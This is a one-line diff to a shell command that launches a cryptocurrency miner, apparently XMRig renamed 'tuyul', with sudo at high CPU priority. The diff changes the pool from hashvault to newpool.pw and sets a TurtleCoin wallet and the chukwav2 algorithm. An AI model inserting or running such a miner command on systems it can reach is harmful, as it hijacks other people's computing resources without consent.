@@ -1,1 +1,1 @@
-sudo ./tuyul --url singapore01.hashvault.pro:80 --user TRTLv3LSAMfLWkG4Sh9gXLXZGTynznP1JWrCRVqbAMec8haEGoa5RgXKZVG26PcRx1BGmgopo5X2mL8jt7QA39tY4z55Y8WTGzU --pass Bulus --cpu-no-yield --donate-level 1 -k --cpu-priority 5 --print-time 10
+sudo ./tuyul --url minenice.newpool.pw:1154 --user TRTLv3LSAMfLWkG4Sh9gXLXZGTynznP1JWrCRVqbAMec8haEGoa5RgXKZVG26PcRx1BGmgopo5X2mL8jt7QA39tY4z55Y8WTGzU@Bulus --pass x --cpu-no-yield --donate-level 1 -k --cpu-priority 5 --print-time 20 -a argon2/chukwav2
